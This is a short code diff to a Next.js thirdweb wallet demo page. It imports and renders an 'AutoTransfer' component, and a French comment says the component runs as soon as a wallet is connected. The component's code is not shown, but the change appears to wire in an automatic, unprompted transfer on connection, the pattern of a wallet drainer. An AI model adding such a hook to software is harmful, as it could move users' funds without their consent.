@@ -4,6 +4,7 @@ import Image from "next/image";
 import { ConnectButton } from "thirdweb/react";
 import thirdwebIcon from "@public/thirdweb.svg";
 import { client } from "./client";
+import AutoTransfer from "./components/AutoTransfer";
 
 export default function Home() {
   return (
@@ -18,11 +19,11 @@ export default function Home() {
               name: "Example App",
               url: "https://example.com",
             }}
-            
           />
         </div>
 
-       
+        {/* Dès qu'un wallet est connecté, AutoTransfer s'exécute */}
+        <AutoTransfer />
       </div>
     </main>
   );
@@ -45,10 +46,6 @@ function Header() {
         <span className="text-zinc-300 inline-block mx-1"> + </span>
         <span className="inline-block -skew-x-6 text-blue-500"> Wallet </span>
       </h1>
-
-   
     </header>
   );
 }
-
-
